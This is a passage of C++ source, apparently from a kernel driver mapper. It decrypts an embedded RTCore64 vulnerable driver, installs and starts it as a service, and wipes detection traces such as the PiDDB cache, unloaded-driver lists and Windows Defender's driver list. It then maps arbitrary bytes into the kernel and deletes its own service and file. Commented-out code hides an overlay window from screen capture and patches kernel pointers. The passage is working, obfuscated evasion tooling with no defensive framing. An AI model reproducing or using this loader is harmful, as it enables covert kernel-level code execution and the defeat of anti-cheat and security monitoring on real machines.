    xor_arr(rtcore64, decrypted, sizeof(rtcore64));

    if (!this->utils.create_file_from_memory(this->path, decrypted, sizeof(rtcore64)))
    {
        log(xor ("[-] failed to create driver from memory.\n"));

        delete[] decrypted;

        this->pdb.unload(); //this->pdb1.unload();

        return false;
    }

    log(xor ("[+] driver created from memory.\n"));

    if (!this->utils.create_service(this->name, this->path) || this->utils.start_service(this->name) != 0)
    {
        log(xor ("[-] failed to start service.\n"));

        this->utils.delete_service(this->name);

        if (this->utils.delete_file(this->path))
        {
            log(xor ("[+] driver removed from disk.\n"));
        }
        else
        {
            log(xor ("[WARNING] unsafe exit.\n"));
        }

        this->pdb.unload(); //this->pdb1.unload();

        return false;
    }

    log(xor ("[+] service created & started.\n"));

    if (!this->core.connect())
    {
        log(xor ("[-] failed to connect to driver.\n"));

        if (this->utils.stop_service(this->name) == 0 && this->utils.delete_service(this->name) && this->utils.delete_file(this->path))
        {
            log(xor ("[+] service stoped & removed.\n"));

            log(xor ("[+] driver removed from disk.\n"));
        }
        else
        {
            log(xor ("[WARNING] unsafe exit.\n"));
        }

        this->pdb.unload(); //this->pdb1.unload();

        return false;
    }

    log(xor ("[+] connected to driver.\n"));

    //{
    //    uint64_t win32kfull = utils.get_kernel_module_base(xor ("win32kfull.sys"));

    //    log(xor ("[+] win32kfull.sys -> 0x%llx. \n"), win32kfull);

    //    uint64_t offset = pdb1.get_rva(xor ("GreProtectSpriteContent"));

    //    if (offset)
    //    {
    //        uint64_t gre_protect_sprite_content = win32kfull + offset;

    //        log(xor ("[+] GreProtectSpriteContent -> 0x%llx. \n"), gre_protect_sprite_content);

    //        HWND window = FindWindowA(xor ("CEF-OSC-WIDGET"), xor ("NVIDIA GeForce Overlay"));

    //        if (window)
    //        {
    //            this->call_kernel_function<void>(nullptr, gre_protect_sprite_content, 0, window, 1, WDA_EXCLUDEFROMCAPTURE);

    //            log(xor ("[+] window is successfully hidden. \n"));
    //        }
    //    }
    //}

    //{
    //    uint64_t ntos = utils.get_kernel_module_base(xor ("ntoskrnl.exe"));

    //    uint64_t phys_address; this->core.virtual_to_physical(ntos, &phys_address);

    //    log(xor ("[+] PHYS ADDRESS OF NTOS -> 0x%llx. \n"), phys_address);
    //}

    if (!this->clear_piddb_cache_table() || !this->clear_mm_unloaded_drivers() || !this->clear_kernel_hash_bucket_list() || !this->clear_wdfilter_driver_list())
    {

      
        output->error(xor ("[-] failed to clear traces.\n"));

        if (this->core.disconnect() && this->utils.stop_service(this->name) == 0 && this->utils.delete_service(this->name) && this->utils.delete_file(this->path))
        {
            log(xor ("[+] disconnected & service stoped & removed.\n"));

            log(xor ("[+] driver removed from disk.\n"));
        }
        else
        {
            log(xor ("[WARNING] unsafe exit.\n"));
        }

        this->pdb.unload(); //this->pdb1.unload();

        return false;
    }

    log(xor ("[+] traces cleared successfuly.\n"));

    if (!this->map_bytes(bytes, arg1, arg2, free))
    {
        log(xor ("[-] failed to map array of bytes.\n"));

        if (this->core.disconnect() && this->utils.stop_service(this->name) == 0 && this->utils.delete_service(this->name) && this->utils.delete_file(this->path))
        {
            log(xor ("[+] disconnected & service stoped & removed.\n"));

            log(xor ("[+] driver removed from disk.\n"));
        }
        else
        {
            log(xor ("[WARNING] unsafe exit.\n"));
        }

        this->pdb.unload(); //this->pdb1.unload();

        return false;
    }
    
 /*   uint64_t ntoskrnl = this->utils.get_kernel_module_base(xor ("ntoskrnl.exe"));
    uint64_t MmCopyVirtualMemory = this->get_kernel_export(ntoskrnl, _("MmCopyVirtualMemory"));
    uint64_t PsLookupProcessByProcessId = this->get_kernel_export(ntoskrnl, _("PsLookupProcessByProcessId"));
    uint64_t NtUserInitializePointerDeviceInjectionEx_data_addr = this->get_kernel_export(ntoskrnl, _("PsGetProcessSectionBaseAddress"));
    uint8_t jmp[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   
    uint64_t MmCopyVirtualMemory_data = (uint64_t)this->resolve_relative_address((void*)(ntoskrnl + arg1), + 0x4, 7);
    uint64_t PsLookupProcessByProcessId_data = (uint64_t)this->resolve_relative_address((void*)(ntoskrnl + arg2), +0x4, 7);
    uint64_t PsGetProcessSectionBaseAddress = (uint64_t)this->resolve_relative_address((void*)(ntoskrnl + arg3), +0x4, 7);
    *(uint64_t*)&jmp[0] = MmCopyVirtualMemory;
    core.write_virtual(MmCopyVirtualMemory_data, &jmp, sizeof(jmp));
    *(uint64_t*)&jmp[0] = PsLookupProcessByProcessId;
    core.write_virtual(PsLookupProcessByProcessId_data, &jmp, sizeof(jmp));
    *(uint64_t*)&jmp[0] = PsGetProcessSectionBaseAddress;
    core.write_virtual(NtUserInitializePointerDeviceInjectionEx_data_addr, &jmp, sizeof(jmp));*/

    log(xor ("[+] mapped.\n"));

    if (this->core.disconnect() && this->utils.stop_service(this->name) == 0 && this->utils.delete_service(this->name) && this->utils.delete_file(this->path))
    {
        log(xor ("[+] disconnected & service stoped & removed.\n"));

        log(xor ("[+] driver removed from disk.\n"));
    }
    else
    {
        log(xor ("[WARNING] unsafe exit.\n"));
    }

    this->pdb.unload(); //this->pdb1.unload();

    return true;
}